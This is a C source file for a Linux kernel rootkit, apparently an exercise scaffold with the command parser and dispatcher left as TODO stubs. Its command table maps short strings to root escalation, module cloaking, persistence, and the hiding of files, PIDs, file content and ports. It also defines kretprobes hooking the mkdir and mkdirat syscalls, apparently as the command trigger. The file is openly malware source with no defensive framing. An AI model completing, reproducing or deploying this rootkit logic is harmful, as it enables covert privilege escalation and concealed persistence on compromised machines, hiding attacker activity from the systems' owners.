// SPDX-License-Identifier: GPL-2.0
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include "rootkit.h"

/* Command kinds for the dispatch table */
enum rk_cmd {
	CMD_ESCALATE,
	CMD_PID_ESCALATE,
	CMD_CLOAK,
	CMD_UNCLOAK,
	CMD_PERSIST,
	CMD_UNPERSIST,
	CMD_HIDE_FILE,
	CMD_UNHIDE_FILE,
	CMD_HIDE_PID,
	CMD_UNHIDE_PID,
	CMD_HIDE_CONTENT,
	CMD_UNHIDE_CONTENT,
	CMD_HIDE_PORT,
	CMD_UNHIDE_PORT,
	CMD_UNKNOWN,
};

/* Command table entry: prefix string, its length, and which kind it maps to */
struct rk_cmd_entry {
	const char *prefix;
	int len;
	enum rk_cmd kind;
	bool has_arg;
};

/* Provided: the command table mapping prefix strings to enum values.
 * Exact-match commands (has_arg == false) use strcmp.
 * Prefix commands (has_arg == true) use strncmp and pass the remainder
 * as the argument. */
static const struct rk_cmd_entry cmd_table[] = {
	{ "e",         1, CMD_ESCALATE,       false },
	{ "cloak",     5, CMD_CLOAK,          false },
	{ "uncloak",   7, CMD_UNCLOAK,        false },
	{ "persist",   7, CMD_PERSIST,        false },
	{ "unpersist", 9, CMD_UNPERSIST,      false },
	{ "p.",        2, CMD_PID_ESCALATE,   true  },
	{ "h.f.",      4, CMD_HIDE_FILE,      true  },
	{ "u.f.",      4, CMD_UNHIDE_FILE,    true  },
	{ "h.i.",      4, CMD_HIDE_PID,       true  },
	{ "u.i.",      4, CMD_UNHIDE_PID,     true  },
	{ "h.c.",      4, CMD_HIDE_CONTENT,   true  },
	{ "u.c.",      4, CMD_UNHIDE_CONTENT, true  },
	{ "h.p.",      4, CMD_HIDE_PORT,      true  },
	{ "u.p.",      4, CMD_UNHIDE_PORT,    true  },
};

// TODO: Implement rk_parse_cmd(cmd, &arg)
// Walk cmd_table. For exact entries (has_arg == false), use strcmp.
// For prefix entries (has_arg == true), use strncmp and set *arg
// to cmd + e->len. Return CMD_UNKNOWN if nothing matches.

// TODO: Implement rk_dispatch(cmd)
// Call rk_parse_cmd, then switch on the result:
//   CMD_ESCALATE       -> rk_escalate()
//   CMD_PID_ESCALATE   -> parse pid with kstrtoint, rk_set_escalate_pid
//   CMD_CLOAK          -> rk_cloak()
//   CMD_UNCLOAK        -> rk_uncloak()
//   CMD_PERSIST        -> rk_persist()
//   CMD_UNPERSIST      -> rk_unpersist()
//   CMD_HIDE_FILE      -> rk_target_add(&rk_file_targets, arg)
//   CMD_UNHIDE_FILE    -> parse idx with kstrtoint, rk_target_remove
//   CMD_HIDE_PID       -> rk_target_add(&rk_pid_targets, arg)
//   CMD_UNHIDE_PID     -> parse idx, rk_target_remove
//   CMD_HIDE_CONTENT   -> rk_target_add(&rk_content_targets, arg)
//   CMD_UNHIDE_CONTENT -> parse idx, rk_target_remove
//   CMD_HIDE_PORT      -> rk_target_add(&rk_port_targets, arg)
//   CMD_UNHIDE_PORT    -> parse idx, rk_target_remove
//   CMD_UNKNOWN        -> return -ENOENT
int rk_dispatch(const char *cmd)
{
	/* TODO: implement */
	return -ENOENT;
}

/* Mkdir probe (handlers are no-ops; dispatch wired externally) */
static int mkdir_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	return 0;
}

static int mkdir_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	return 0;
}

struct kretprobe rk_mkdir_probe = {
	.handler        = mkdir_return,
	.entry_handler  = mkdir_entry,
	.maxactive      = 20,
	.kp.symbol_name = "__x64_sys_mkdir",
};

struct kretprobe rk_mkdirat_probe = {
	.handler        = mkdir_return,
	.entry_handler  = mkdir_entry,
	.maxactive      = 20,
	.kp.symbol_name = "__x64_sys_mkdirat",
};
